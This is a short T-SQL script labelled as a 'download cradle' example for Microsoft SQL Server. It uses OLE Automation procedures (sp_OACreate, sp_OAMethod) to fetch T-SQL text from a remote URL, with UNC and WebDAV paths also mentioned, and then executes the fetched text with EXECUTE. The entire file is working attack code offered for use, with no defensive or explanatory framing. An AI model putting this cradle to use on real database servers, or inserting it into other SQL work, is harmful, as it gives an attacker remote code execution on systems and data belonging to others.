-- OLE Automation Procedure - Download Cradle Example - Option 2 
-- Can handle larger payloads, but requires a table

-- Note: This also works with unc paths \\ip\file.txt
-- Note: This also works with webdav paths \\ip@80\file.txt However, the target web server needs to support propfind.

-- Setup Variables
DECLARE @url varchar(300)   
DECLARE @WinHTTP int  
DECLARE @Handle  int  
DECLARE @Command varchar(8000)

-- Set target url containting TSQL
SET @url = 'http://127.0.0.1/mycmd.txt'

-- Create temp table to store downloaded string
CREATE TABLE #text(html text NULL) 

-- Setup namespace
EXEC @Handle=sp_OACreate 'WinHttp.WinHttpRequest.5.1',@WinHTTP OUT  

-- Call open method to configure HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP, 'Open',NULL,'GET',@url,'false'

-- Call Send method to send the HTTP request
EXEC @Handle=sp_OAMethod @WinHTTP,'Send'

-- Capture the HTTP response content 
INSERT #text(html) 
EXEC @Handle=sp_OAGetProperty @WinHTTP,'ResponseText'

-- Destroy the object
EXEC @Handle=sp_OADestroy @WinHTTP  

-- Display the commad
SELECT @Command = html from #text
SELECT @Command

-- Run the command
EXECUTE (@Command)

-- Remove temp table
DROP TABLE #text
